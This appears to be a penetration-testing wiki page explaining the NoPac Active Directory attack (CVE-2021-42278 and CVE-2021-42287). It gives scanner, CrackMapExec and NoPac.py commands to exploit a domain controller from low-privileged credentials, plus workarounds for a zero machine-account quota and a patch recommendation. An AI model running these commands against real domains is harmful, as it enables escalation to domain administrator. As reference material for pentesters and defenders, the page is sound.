---
layout: default
title: NoPac [CVE-2021-42278] & [CVE-2021-42287]
parent: Active Directory
nav_order: 9
permalink: /ad/nopac/
---

# NoPac [CVE-2021-42278] & [CVE-2021-42287]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

NoPac relies on two vulnerablies which are:
* **CVE-2021-42278**: Security Account Manager (SAM) spoofing security bypass vulnerability.
* **CVE-2021-42287**: privilege escalation vulnerability associated with the Kerberos Privilege Attribute Certificate (PAC).

By default, any domain user can add up to 10 computers in the domain. CVE-2021-42278 consists in adding a new machine account with a **random name** in the domain then replace it with one of the domain controllers omitting the symbol `$` at the end.

Then, request a Kerberos TGT for the created account and change its *samAccountName* back to the originally randomly generated. CVE-2021-42287 consists in requesting an access token from the Ticket Granting Server (TGS) with the previous TGT. Since the computer account does not exist in the domain, the TGS will match the closest one and automatically add the symbol `$` at the end.

By doing so, you will request an access token impersonating a domain controler and get access to the service with domain administratorish privileges.

## Prerequisites

* Low privileged domain user credentials.

## Exploit

For the exploit, you can use [Ridter's GitHub repository](https://github.com/Ridter/noPac). Starting with the scanner to check if the targeted domain is vulnerable.

```bash
# Check if domain is vulnerable to NoPac.
python scanner.py $domain/$username:$password -dc-ip $dc_ip

# Check if domain is vulnerable to NoPac with CrackMapExec.
cme smb $dc_ip -d $domain -u $username -p $password -M nopac

# If ticket sizes are differents with and without PAC, you can exploit NoPac.
python NoPac.py $domain/$username:$password -dc-ip $dc_ip
```

For some reasons, `ms-DS-MachineAccountQuota` could be set to 0 instead of 10 by default, preventing you from adding a now machine account. If so, you can either:
1. Find an existing computer which can be modified by your low privileged domain user.
2. Find an existing computer which has *CreateChild* permission.

## Recommendations

- [ ] Apply Microsoft patches [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e) and [KB5008380](https://support.microsoft.com/en-au/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041) on domain controllers.